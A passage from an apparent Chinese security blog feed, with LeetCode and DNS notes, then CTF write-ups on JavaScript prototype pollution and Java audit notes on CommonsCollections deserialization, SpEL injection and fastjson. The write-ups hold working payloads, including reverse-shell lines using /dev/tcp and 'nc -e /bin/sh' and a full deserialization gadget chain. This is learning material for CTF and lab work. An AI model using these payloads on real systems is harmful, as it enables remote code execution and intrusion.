&#39;XL&#39;:30, &#39;L&#39;:50, &#39;XC&#39;:80, &#39;C&#39;:100, &#39;CD&#39;:300, &#39;D&#39;:500, &#39;CM&#39;:800, &#39;M&#39;:1000}</code></pre><p>本来 <code>IV</code> 是代表4的，但是在这里却减去了1，其余的9，40，90都是类似的</p><pre><code class="python">class Solution:    def romanToInt(self, s: str) -&gt; int:        d = {&#39;I&#39;:1, &#39;IV&#39;:3, &#39;V&#39;:5, &#39;IX&#39;:8, &#39;X&#39;:10, &#39;XL&#39;:30, &#39;L&#39;:50, &#39;XC&#39;:80, &#39;C&#39;:100, &#39;CD&#39;:300, &#39;D&#39;:500, &#39;CM&#39;:800, &#39;M&#39;:1000}        result = 0        for i,n in enumerate(s):            a = max(i-1,0)            b = d.get(s[a:i+1], d[n]) # 每次取两个元素，如果有就说明是4，9这类，如果没有就采取默认的 d[n]            result += b        return result</code></pre><p>不得不说这种方法确实很巧妙，甚至可以浓缩为一句话</p><pre><code class="python">return sum(d.get(s[max(i-1, 0):i+1], d[n]) for i, n in enumerate(s))</code></pre><p>不过效率对比上来看，浓缩之后的速度反而变慢了</p><p><img src="/posts/734660ee/1580397813912.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一个Linux命令-dig</title>
      <link href="/posts/f1616294/"/>
      <url>/posts/f1616294/</url>
      
        <content type="html"><![CDATA[<h2 id="基本选项："><a href="#基本选项：" class="headerlink" title="基本选项："></a>基本选项：</h2><p>@&lt;服务器地址&gt;：指定进行域名解析的域名服务器；<br>-b&lt;ip地址&gt;：当主机具有多个IP地址，指定使用本机的哪个IP地址向域名服务器发送域名查询请求；<br>-f&lt;文件名称&gt;：指定dig以批处理的方式运行，指定的文件中保存着需要批处理查询的DNS任务信息；<br>-P：指定域名服务器所使用端口号；<br>-t&lt;类型&gt;：指定要查询的DNS数据类型；<br>-x&lt;IP地址&gt;：执行逆向域名查询；<br>-4：使用IPv4；<br>-6：使用IPv6；<br>-h：显示指令帮助信息。</p><p>比如我要用Google的DNS</p><p><code>dig prontosil.club @8.8.8.8</code></p><p>查询解析记录<br><code>dig prontosil.club -t CNAME</code></p><p>得到结果：</p><pre><code>;; QUESTION SECTION:;prontosil.club.                        IN      CNAME;; ANSWER SECTION:prontosil.club.         600     IN      CNAME   2zeqwj.coding-pages.com.;; Query time: 55 msec</code></pre><p>查询 TXT 记录</p><p><code>dig _pages-challenge.prontosil.club -t TXT</code></p><p>得到结果：</p><pre><code>;; ANSWER SECTION:_pages-challenge.prontosil.club. 600 IN TXT     &quot;rCAijO55WRowkOABj2JwHDEacVPpxo5rkCtDr2eG7J0=.ItO58cZnxtPdQAIzuUTAumBPxAZ4nwBjsGfmWl/Rhg0=&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> dig </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域名解析记录</title>
      <link href="/posts/b69cd839/"/>
      <url>/posts/b69cd839/</url>
      
        <content type="html"><![CDATA[<h2 id="博客域名解析"><a href="#博客域名解析" class="headerlink" title="博客域名解析"></a>博客域名解析</h2><p>如下是我在腾讯云后台的设置</p><p><img src="/posts/b69cd839/1580398267570.png" alt></p><p>按照腾讯云的解释</p><p><img src="/posts/b69cd839/1580398281271.png" alt></p><p>可以查询到 <a href="http://www.prontosil.club" target="_blank" rel="noopener">www.prontosil.club</a> 的解析记录为</p><p><img src="/posts/b69cd839/1580398293465.png" alt></p><p>经过多次的折腾发现，<code>@</code> 解析记录只能有一个默认，只能有一个记录类型，比如我这里是A记录设置为 <code>@</code>，那么CNAME记录就不能设置为 <code>@</code></p><p>同时我终于发现<code>www</code> 和裸域的区别了，之前还一直以为是同一个</p><h2 id="裸域"><a href="#裸域" class="headerlink" title="裸域"></a>裸域</h2><p>不加 www 的裸域名好处主要是域名更加简短、容易记忆。坏处就多了，讲几个主要的技术原因：<br>裸域名只能绑定 DNS 的 A 记录，不能绑定 CNAME 记录。也就是说你不能把裸域设定为另外域名的别名。很多时候这对管理不是很方便，特别是使用第三方托管服务的时候。如果第三方迁移服务器导致 IP 地址变更，你必须自己去更改 DNS 的 A 记录。</p><h2 id="TXT记录"><a href="#TXT记录" class="headerlink" title="TXT记录"></a>TXT记录</h2><p><img src="/posts/b69cd839/1580398319776.png" alt></p><p>这种可以用来出题</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域名 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript原型链污染</title>
      <link href="/posts/5d5d07b8/"/>
      <url>/posts/5d5d07b8/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript原型链污染"><a href="#JavaScript原型链污染" class="headerlink" title="JavaScript原型链污染"></a>JavaScript原型链污染</h1><h2 id="如何继承"><a href="#如何继承" class="headerlink" title="如何继承"></a>如何继承</h2><p>比如，现在有一个”动物”对象的构造函数。</p><pre><code class="javascript">function Animal(){this.species = &quot;动物&quot;;}</code></pre><p>还有一个”猫”对象的构造函数。</p><pre><code class="JavaScript">function Cat(name,color){　　　　this.name = name;　　　　this.color = color;　　}</code></pre><p>要让<code>Cat</code>这个类去继承<code>Animal</code>类，如果在其他的语言中，一般就是<code>extented</code>即可</p><p>但是在JavaScript中，</p><pre><code class="javascript">Cat.prototype = new Animal();Cat.prototype.constructor = Cat;var cat1 = new Cat(&quot;大毛&quot;,&quot;黄色&quot;);alert(cat1.species); // 动物</code></pre><p>第一行我们直接修改了<code>Cat</code>的<code>prototype</code>属性，让其指向<code>Animal</code></p><p>这一点不难理解，之后所有<code>Cat</code>实例化的对象cat，它的<code>__proto__</code>就会指向<code>Animal</code>(因为<code>Cat.prototype==cat.__proto__</code>)</p><p>但是第二行比较疑惑，<code>Cat.prototype.constructor</code>又代表了什么？</p><p>其实在<code>Cat.prototype</code>中原先是有一个<code>constructor</code>这个属性的，而<code>Cat.prototype.constructor==Cat</code>这个是成立的</p><p>但是我们直接修改了<code>Cat.prototype</code>之后，此时的<code>Cat.prototyep.constructot != Cat</code></p><p>这就比较荒诞了，所以我们要单独修改将这一个属性修改回来</p><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><h3 id="redpwnctf2019-blueprint"><a href="#redpwnctf2019-blueprint" class="headerlink" title="redpwnctf2019 blueprint"></a>redpwnctf2019 blueprint</h3><p>题目的简要功能就是能够发表文章，并且选择是否公开，传递的数据是json格式的</p><p>每一个用户有一个<code>user_id</code>，第一次访问的时候会通过<code>makeId</code>函数给一个id</p><p><img src="/posts/5d5d07b8/1572246225198.png" alt></p><p>调试的时候发现每个用户创建的时候会将一个<code>(userId,user)</code>存入到一个map中，<code>userId</code>就是之前生成的，而这个<code>user</code>对象中就有flag，也就是说每一个用户都有一个flag</p><p>生成的<code>user</code>对象</p><p><img src="/posts/5d5d07b8/1572246345905.png" alt></p><p>之后会将请求的内容给<code>merge</code>到<code>parsedBody</code>中</p><p>查看<code>defaultsDeep</code>的例子：</p><pre><code>_.defaultsDeep({ &#39;user&#39;: { &#39;name&#39;: &#39;barney&#39; } }, { &#39;user&#39;: { &#39;name&#39;: &#39;fred&#39;, &#39;age&#39;: 36 } });// =&gt; { &#39;user&#39;: { &#39;name&#39;: &#39;barney&#39;, &#39;age&#39;: 36 } }</code></pre><p>之后就会将<code>parsedBody</code>中的<code>content</code>和<code>public</code>存放到map中</p><p><img src="/posts/5d5d07b8/1572246569945.png" alt></p><p>之后的功能也不难想了，如果<code>pubic</code>为true就会展示在首页上，如果不为true就会不会展示</p><p>而我们之前提到每一个用户其实都是有一个flag的，只是这个<code>public</code>属性没有进行设置而已。</p><p>思路就是通过原型链污染使得flag能被展示出来</p><p>渲染页面的主要部分如下：</p><pre><code class="javascript">blueprints: Object.entries(user.blueprints).map(([k, v]) =&gt; ({  id: k,  content: v.content,  public: v.public,})),</code></pre><p>exp</p><pre><code class="python">import requestsURL = &quot;http://localhost/&quot;user_id = &quot;559eb9b06eb8c581b74f33c1202bff50&quot;res = requests.post(URL+&quot;make&quot;,cookies={&quot;user_id&quot;:user_id},json={&quot;content&quot;:&quot;aaaa&quot;, &quot;public&quot;:&quot;true&quot;,&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;public&quot;:&quot;true&quot;}}})print(res.text)res2 = requests.get(URL, cookies={&quot;user_id&quot;:user_id})print(res2.text)</code></pre><h3 id="新春战疫-ezexpress"><a href="#新春战疫-ezexpress" class="headerlink" title="新春战疫 ezexpress"></a>新春战疫 ezexpress</h3><p>用到了JavaScript的一个小trick</p><p>两个奇特的字符 ==”ı”、”ſ”。==</p><p> 这两个字符的“大写”是I和S。也就是说”ı”.toUpperCase() == ‘I’，”ſ”.toUpperCase() == ‘S’。通过这个小特性可以绕过一些限制。</p><p>绕过之后，就可以登陆,看到一个很显然的 <code>clone</code> 操作</p><pre><code class="js">router.post(&#39;/action&#39;, function (req, res) {  if(req.session.user.user!=&quot;ADMIN&quot;){res.end(&quot;&lt;script&gt;alert(&#39;ADMIN is asked&#39;);history.go(-1);&lt;/script&gt;&quot;)}   req.session.user.data = clone(req.body);  res.end(&quot;&lt;script&gt;alert(&#39;success&#39;);history.go(-1);&lt;/script&gt;&quot;);  });</code></pre><p>那么就可以污染属性了。污染哪个呢？</p><pre><code class="js">router.get(&#39;/&#39;, function (req, res) {  if(!req.session.user){    res.redirect(&#39;/login&#39;);  }  res.outputFunctionName=undefined;  res.render(&#39;index&#39;,data={&#39;user&#39;:req.session.user.user});});router.get(&#39;/info&#39;, function (req, res) {  res.render(&#39;index&#39;,data={&#39;user&#39;:res.outputFunctionName});})</code></pre><p>我们这里就直接污染 <code>res.outputFunctionName</code> </p><p>(测试的时候Windows下无法用nc弹shell)</p><p><img src="/posts/5d5d07b8/1583322699980.png" alt></p><p>然后访问 info 页面即可</p><p>原来的payload</p><pre><code class="json">{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;}}</code></pre><h3 id="HGAME"><a href="#HGAME" class="headerlink" title="HGAME"></a>HGAME</h3><p>这题也是JavaScript原型链污染，不过这里更明显</p><pre><code class="js">if (sekiro.attackInfo.additionalEffect) {    var fn = Function(&quot;sekiro&quot;, sekiro.attackInfo.additionalEffect + &quot;\nreturn sekiro&quot;)    sekiro = fn(sekiro)}</code></pre><p><code>Function</code> 是动态构造函数</p><p>payload</p><pre><code class="json"> {&quot;solution&quot;:&quot;1&quot;,&quot;__proto__&quot;:{&quot;additionalEffect&quot;:&quot;global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;nc vps-ip port -e /bin/sh&#39;,function(){});&quot;}}</code></pre><p><img src="/posts/5d5d07b8/1583323453485.png" alt></p><p>然后vps上即可监听到请求(当然我这里只是nc一下)</p><p>写到这里突然又想起来了 2019XNUCA的一道JavaScript原型链污染的题目</p><h3 id="2019-XNUCA-hardjs"><a href="#2019-XNUCA-hardjs" class="headerlink" title="2019 XNUCA hardjs"></a>2019 XNUCA hardjs</h3><p>(盗了一张图过来)</p><p>能够RCE的点出在 <code>res.render</code> 处，具体的就不分析了，这里是最后的变量拼接的地方</p><p><img src="/posts/5d5d07b8/j_3.png" alt></p><p>从这里可以看到有两个拼接的变量可以使用</p><p>于是就能够构造两个payload</p><pre><code class="json">{&quot;type&quot;:&quot;wiki&quot;,&quot;content&quot;:{&quot;constructor&quot;: {&quot;prototype&quot;: {&quot;client&quot;: true,&quot;escapeFunction&quot;: &quot;1; return process.env.FLAG&quot;,&quot;debug&quot;:true, &quot;compileDebug&quot;: true}}}}</code></pre><p>或者</p><pre><code class="json"> {    &quot;content&quot;: {        &quot;constructor&quot;: {            &quot;prototype&quot;: {            &quot;outputFunctionName&quot;:&quot;_tmp1;return process.env.FLAG;//;var __tmp2&quot;            }        }    },    &quot;type&quot;: &quot;test&quot;}</code></pre><p>当然要是想弹shell也不是不可以</p><pre><code class="json">{    &quot;content&quot;: {        &quot;constructor&quot;: {            &quot;prototype&quot;: {            &quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/xx 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;            }        }    },    &quot;type&quot;: &quot;test&quot;}</code></pre><p>现在回顾起当时遇到这道题还啥都不会，现在又突然想起来的这种感觉好好玩</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/6101#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/6101#toc-1</a></p><p><a href="http://passingfoam.com/2019/08/31/XNUCA-2019-web-复现/" target="_blank" rel="noopener">http://passingfoam.com/2019/08/31/XNUCA-2019-web-%E5%A4%8D%E7%8E%B0/</a></p><p><a href="https://xz.aliyun.com/t/6113#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/6113#toc-5</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java审计笔记</title>
      <link href="/posts/21b61fbe/"/>
      <url>/posts/21b61fbe/</url>
      
        <content type="html"><![CDATA[<h2 id="反射相关概念"><a href="#反射相关概念" class="headerlink" title="反射相关概念"></a>反射相关概念</h2><p>正常执行一条命令</p><pre><code class="java">Runtime.getRuntime().exec(&quot;calc&quot;);</code></pre><p>如果通过反射来执行：</p><pre><code class="java">Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);clazz.getMethod(&quot;exec&quot;, String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(null), &quot;calc&quot;);</code></pre><p><code>Runtime</code> 的构造方法是私有的，遵循单例模式，所以无法直接调用，但是可以通过调用静态方法 <code>getRuntime</code> 来获得一个 <code>Runtime</code> 对象，这个方法是静态的，并不需要传递类的实例进去(不然就陷入了死循环)，而调用之后返回的结果是一个 <code>Runtime</code> 对象，作为 <code>exec</code> 方法的第一个参数，这是因为 <code>exec</code> 方法不是静态方法</p><p>我们正常执行方法是 <code>[1].method([2], [3], [4]...)</code> ，其实在反射里就是 <code>method.invoke([1], [2], [3], [4]...)</code> </p><p>当然如果分解开来比较好理解一点:</p><pre><code class="java">Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);  // 加载 java.lang.Runtime类Method method1 = clazz.getMethod(&quot;getRuntime&quot;);    //获取到getRuntime方法Runtime runtime = (Runtime) method1.invoke(null);  //调用，得到Runtime对象(其实可以直接拿这个对象去调用exec了)//runtime.exec(&quot;calc&quot;) 即可Method method2 = clazz.getMethod(&quot;exec&quot;, String.class); //得到exec方法method2.invoke(runtime, &quot;calc&quot;); //调用exec方法</code></pre><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>java的反序列化是通过<code>ObjectOutputStream</code>和<code>ObjectInputStream</code>两个类来实现的，同时要序列化的类必须实现<code>Serializable</code>接口</p><p>与PHP类似，Java在序列化一个对象的时候会调用<code>writeObject</code>方法，在反序列化一个对象的时候会调用<code>readObject</code>方法</p><h2 id="Apache-CommonsCollections反序列化"><a href="#Apache-CommonsCollections反序列化" class="headerlink" title="Apache CommonsCollections反序列化"></a>Apache CommonsCollections反序列化</h2><p>只要弄懂了反射的逻辑，那么理解 <code>CommonsCollections</code> 的payload也就不难了,重点在构造 <code>transformers</code> 数组的时候</p><pre><code class="java">Transformer[] transformers = new Transformer[]{        new ConstantTransformer(Runtime.class),         new InvokerTransformer(&quot;getMethod&quot;, new Class[]{                String.class, Class[].class}, new Object[]{                &quot;getRuntime&quot;,null}),        new InvokerTransformer(&quot;invoke&quot;, new Class[]{                Object.class, Object[].class}, new Object[]{null,new Object[0]}),        new InvokerTransformer(&quot;exec&quot;, new Class[]{                String.class}, new Object[]{&quot;calc&quot;})};Transformer transformedChain = new ChainedTransformer(transformers);transformedChain.transform(transformers);  //触发</code></pre><p><code>transformers</code> 数组中的每一个对象都会调用一次 <code>transform</code> 函数，<code>ConstantTransformer</code> 直接返回了 <code>Runtime.class</code>  作为下一个 <code>transform</code> 的参数 等价于</p><pre><code>Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);  // 加载 java.lang.Runtime类</code></pre><p>之后 <code>InvokerTransformer</code> 的 <code>transform</code> 接收传过来的 <code>Runtime.class</code> 去调用其 <code>getMethod</code>方法，等价于</p><pre><code>Method method1 = clazz.getMethod(&quot;getRuntime&quot;);    //获取到getRuntime方法</code></pre><p>返回了一个 <code>Method</code>类型的作为下一次 <code>transform</code> 的参数，之后的过程就是分别调用 <code>invoke</code> 和 <code>exec</code> 方法，等价于</p><pre><code>Runtime runtime = (Runtime) method1.invoke(null);  //调用，得到Runtime对象(其实可以直接拿这个对象去调用exec了)runtime.exec(&quot;calc&quot;)</code></pre><p>由于 <code>getRuntime</code> 方法是静态的， <code>invoke</code> 的时候第一个参数不必是类的实例，之后由于已经获取到了 <code>Runtime</code> 的实例就不再需要通过反射去获得 <code>exec</code> 方法再 <code>invoke</code> 了，省去了一点麻烦的步骤</p><p>一开始在分析 <code>InvokerTransformer</code> 的 <code>transform</code> 方法时被绕晕了，还以为是反射的反射，但是如果从函数所起的作用来分析就很明确了</p><p><code>getMethod</code> 和 <code>invoke</code> 方法的原型，所以我们在反射的时候也需要指定这些参数的class</p><pre><code class="java">public Method getMethod(String name, Class&lt;?&gt;... parameterTypes)public Object invoke(Object obj, Object... args)</code></pre><p>但是实际上我们在调用 <code>getMethod</code> 的时候，只需要指定第一个参数为 <code>getRuntime</code> 即可，那么第二个参数我们可以设为 null 或者 <code>new Class[0]</code> ，同理， invoke 方法这里不需要指定参数可以将两个参数都设置为 null</p><p>理解一下 <code>collections.map.TransformedMap</code> 这个类，提供了一个 <code>decorateTransform</code> 方法，可以将普通的map转化为 <code>TransformedMap</code> ，这个函数的原型</p><pre><code class="java">public static Map decorateTransform(Map map, Transformer keyTransformer, Transformer valueTransformer) </code></pre><p>第二个和第三个参数都是 <code>Transformer</code> 类型的，也就是每次更新map的时候，比如对map执行 put操作的时候</p><pre><code class="java">public Object put(Object key, Object value) {    key = transformKey(key);    value = transformValue(value);    return getMap().put(key, value);}</code></pre><p>会针对 key 和 value 执行 transform 操作</p><p>结合之前的 payload, 我们可以编写这个代码弹出计算器</p><pre><code class="java">public class Test {    public static void main(String[] args) {        Transformer[] transformers = new Transformer[]{                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {                        String.class, Class[].class}, new Object[] {                        &quot;getRuntime&quot;, new Class[0]}),                new InvokerTransformer(&quot;invoke&quot;, new Class[] {                        Object.class, Object[].class }, new Object[] {                        null, null }),                new InvokerTransformer(&quot;exec&quot;, new Class[] {                        String.class }, new Object[] {&quot;calc.exe&quot;})};        Transformer transformedChain = new ChainedTransformer(transformers);        Map innerMap = new HashMap();         Map outMap = TransformedMap.decorate(innerMap, null, transformedChain); //转变为 TransformedMap 操作        outMap.put(&quot;key&quot;, &quot;value&quot;);//触发payload    }}</code></pre><p>但是网上给的payload都是针对 <code>setValue</code> 方法触发的payload，这是怎么找到的</p><p>经过调试我发现 <code>AbstractMapEntryDecorator</code> 实现了 <code>Map</code>，其中的  <code>setValue</code> 是这么写的</p><pre><code class="java">public Object setValue(Object object) {    return entry.setValue(object);}</code></pre><p>这个方法之后又被 <code>AbstractInputCheckedMapDecorator</code> 的内部 <code>MapEntry</code> 类重写</p><pre><code class="java">public Object setValue(Object value) {    value = parent.checkSetValue(value); //多了一次 checkSetValue 操作    return entry.setValue(value);}</code></pre><p>这个多出来的 <code>checkSetValue</code> 方法又是 <code>AbstractInputCheckedMapDecorator</code>  的，而 <code>TransformedMap</code> 正是重写了这个方法</p><p><img src="/posts/21b61fbe/1580461320232.png" alt></p><p>所以实际上是的结果是调用了 <code>TransformedMap</code> 的 <code>checkSetValue</code> 方法</p><pre><code class="java">protected Object checkSetValue(Object value) {    return valueTransformer.transform(value);}</code></pre><p>这样就能触发payload了</p><p>之后寻找能够触发 <code>setValue</code> 方法的类，这里利用了 <code>AnnotationInvocationHandler</code></p><p>不过这里似乎只有jdk7才能运行，我开始用的jdk8不能成功</p><p>最后的测试代码</p><pre><code class="java">package com.alibaba.dubbo.demo;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.File;import java.io.FileOutputStream;import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Retention;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.util.HashMap;import java.util.Map;import javax.management.ObjectInstance;import com.alibaba.dubbo.common.serialize.ObjectInput;/** * @description: 测试 * @author: Pxy * @create: 2020-01-31 16:21 **/public class Test {        public static void main(String[] args) throws Exception {            Transformer[] transformers = new Transformer[]{                    new ConstantTransformer(Runtime.class),                    new InvokerTransformer(&quot;getMethod&quot;, new Class[] {                            String.class, Class[].class}, new Object[] {                            &quot;getRuntime&quot;, new Class[0]}),                    new InvokerTransformer(&quot;invoke&quot;, new Class[] {                            Object.class, Object[].class }, new Object[] {                            null, new Object[0]}),                    new InvokerTransformer(&quot;exec&quot;, new Class[] {                            String.class }, new Object[] {&quot;calc.exe&quot;})};            Transformer transformedChain = new ChainedTransformer(transformers);            Map innerMap = new HashMap();            innerMap.put(&quot;key&quot;, &quot;value&quot;);            Map outMap = TransformedMap.decorate(innerMap, null, transformedChain);            Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);            Constructor ctor = clazz.getDeclaredConstructor(Class.class, Map.class);            ctor.setAccessible(true);            Object instance = ctor.newInstance(Retention.class, outMap);            File f = new File(&quot;payload.bin&quot;);            ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));            out.writeObject(instance);            out.flush();            out.close();            ObjectInputStream input = new ObjectInputStream(new FileInputStream(&quot;payload.bin&quot;));            input.readObject();            input.close();        }}</code></pre><p>先断在这个 <code>AnnotationInvocationHandler</code> 类中</p><p><img src="/posts/21b61fbe/1580469219896.png" alt></p><p>然后触发 <code>checkSetValue</code> 方法</p><p><img src="/posts/21b61fbe/1580469249634.png" alt="1580469249634"></p><p>最后成功弹出计算器</p><h2 id="SPEL表达式注入"><a href="#SPEL表达式注入" class="headerlink" title="SPEL表达式注入"></a>SPEL表达式注入</h2><p>类似于 jinja 表达式，不过更为强大</p><p>编写一个接口进行测试：</p><pre><code class="java">@GetMapping(&quot;/spel&quot;)public String spel(String input) throws  Exception{    SpelExpressionParser parser = new SpelExpressionParser();    Expression expression = (Expression)parser.parseExpression(input);    return expression.getValue().toString();}</code></pre><p>访问 <code>/spel?input=new java.lang.ProcessBuilder(&quot;calc&quot;).start()</code></p><p><img src="/posts/21b61fbe/1580468482834.png" alt></p><h2 id="code-breaking-javacon"><a href="#code-breaking-javacon" class="headerlink" title="code-breaking javacon"></a>code-breaking javacon</h2><p>这道题并不算难，结合了java反射和spel表达式注入</p><p>一个spring框架写的登陆界面，用户名和密码都是admin，有一个remember me可以勾选</p><p><code>application.yml</code>中有一些相关的设置</p><pre><code class="yaml">keywords:  blacklist:     - java.+lang    - Runtime    - exec.*\(user:  username: admin  password: admin  rememberMeKey: c0dehack1nghere1</code></pre><p>有一个黑名单过滤了一些字符，不过可以很容易地用字符串拼接进行绕过</p><p>仔细分析代码，其中有存在一处类似模板渲染的语句</p><pre><code class="java">ParserContext parserContext = new TemplateParserContext();Expression exp = parser.parseExpression(val, parserContext);SmallEvaluationContext evaluationContext = new SmallEvaluationContext();return exp.getValue(evaluationContext).toString();</code></pre><blockquote><p>Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。</p></blockquote><p>这一处位于<code>getAdvanceValue</code>函数中，调用它的是这里：</p><pre><code class="java">@GetMappingpublic String admin(@CookieValue(value = &quot;remember-me&quot;, required = false) String rememberMeValue,                    HttpSession session,                    Model model) {    if (rememberMeValue != null &amp;&amp; !rememberMeValue.equals(&quot;&quot;)) {        String username = userConfig.decryptRememberMe(rememberMeValue);        if (username != null) {            session.setAttribute(&quot;username&quot;, username);        }    }    Object username = session.getAttribute(&quot;username&quot;);    if(username == null || username.toString().equals(&quot;&quot;)) {        return &quot;redirect:/login&quot;;    }    model.addAttribute(&quot;name&quot;, getAdvanceValue(username.toString()));    return &quot;hello&quot;;}</code></pre><p>这里相当于是admin的管理界面，首先会检查<code>rememberMeValue</code>的值，并且尝试去解密其中的用户名，同时加入到<code>session</code>中，之后执行<code>model.addAttribute(&quot;name&quot;, getAdvanceValue(username.toString()));</code></p><p>那么这里的关键就是<code>cookie</code>中的rememberMeValue，由于我们已经知道了加密的算法和密钥(代码都是直接给的)，那么就可以通过伪造<code>rememberMeValue</code>来达到rce</p><p>首先需要一条java的反射链，因为要绕过一些关键字：</p><pre><code class="java">String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,String.class).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),&quot;calc&quot;)</code></pre><p>之后要将其构造成Spel表达式，就是增加一个<code>T()</code></p><p>先本地测试弹一个计算器</p><pre><code class="java">System.out.println(Encryptor.encrypt(&quot;c0dehack1nghere1&quot;, &quot;0123456789abcdef&quot;, &quot;#{T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;ex\&quot;+\&quot;ec\&quot;,T(String[])).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;getRu\&quot;+\&quot;ntime\&quot;).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;)),new String[]{\&quot;calc\&quot;})}&quot;)); //注意java的字符串必须是双引号</code></pre><p>生成payload</p><pre><code>bvik1nAmjEAllRdn5UKWGC9uCj0hW0P2B6k1uigkS1acKxD9b_xNi-x09UGgjU1DvDEI2GGk4Jn0ApM_cSVc0G7kGnvvtewNRVsfqFUCR0fMAPqbj6yqACW6XVtt8Fp1nBwebKd7pkYSZCv6Yj3X7H-0-8HDV6F3sS3yWHUQEBPAyiNmKfkSKUV5VVlNdo16Nij8YX8HvKdeMHJ7_5Sdjfmfq3dKPeUOivMyVp_GdEkffgly4YX4eWCOzQRr4uQgodsKw2pC9N9udnw3Fz7O5ZhzmoYttjLubBowMtkF-Q6HHCvBrK9SWCzRQXC6jqYX_XeqyZuDreUixnpXpzlN9Gj_AWy8DB8Dxea8atf2wr8=</code></pre><p>之后登陆再替换掉cookie</p><p><img src="/posts/21b61fbe/1573973547431-1580346732870.png" alt="结果"></p><h2 id="fastjson-反序列化-仅复现"><a href="#fastjson-反序列化-仅复现" class="headerlink" title="fastjson 反序列化(仅复现)"></a>fastjson 反序列化(仅复现)</h2><p>docker开启环境之后，首先需要生成一个 <code>TouchFile</code> 恶意文件，然后编译成class文件</p><pre><code class="java">// javac TouchFile.javaimport java.lang.Runtime;import java.lang.Process;public class TouchFile {    static {        try {            Runtime rt = Runtime.getRuntime();            String[] commands = {&quot;touch&quot;, &quot;/tmp/success&quot;};            Process pc = rt.exec(commands);            pc.waitFor();        } catch (Exception e) {            // do nothing        }    }}</code></pre><p>用python开一个服务器，监听8001端口</p><p>再开启一个rmi服务器，靶机ip为192.168.99.100，本机相对靶机是192.168.99.1</p><p><img src="/posts/21b61fbe/1580469670376.png" alt></p><p>这时候将payload发送过去，payload只是演示了在 tmp 目录下创建文件</p><p><img src="/posts/21b61fbe/1580469645918.png" alt></p><p>创建成功</p><p><img src="/posts/21b61fbe/1580469708254.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/#h4.1_%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%E6%A6%82%E8%BF%B0" target="_blank" rel="noopener">Java反序列化漏洞通用利用分析</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE复习</title>
      <link href="/posts/2e545689/"/>
      <url>/posts/2e545689/</url>
      
